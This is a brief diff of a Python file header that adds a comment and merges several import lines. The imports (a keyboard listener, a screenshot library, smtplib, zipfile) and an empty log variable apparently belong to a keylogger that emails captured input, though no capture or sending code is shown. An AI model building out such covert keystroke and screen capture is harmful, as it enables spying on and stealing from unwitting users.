@@ -3,16 +3,14 @@
 '''
 Name : Alexis Rodriguez
 Date : 2020-02-09
+This is an import... so please do not erase
 '''
 
 from pynput import keyboard
 import pyautogui as pygrab
 import threading
 import smtplib
-import zipfile
-import sys
-import os
-import time
+import zipfile, sys, os, time
 
 log = ''
 
